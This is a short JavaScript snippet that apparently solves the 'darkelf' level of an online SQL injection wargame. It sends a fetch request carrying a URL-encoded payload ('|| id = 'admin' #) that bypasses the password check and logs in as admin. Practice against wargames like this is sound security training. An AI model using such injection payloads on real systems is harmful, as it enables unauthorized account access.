fetch('https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27||%20id%20=%20%27admin%27%20%23',{
        include: 'credentials'
    }
).then((x) => x.text()).then((x) => console.log(x));
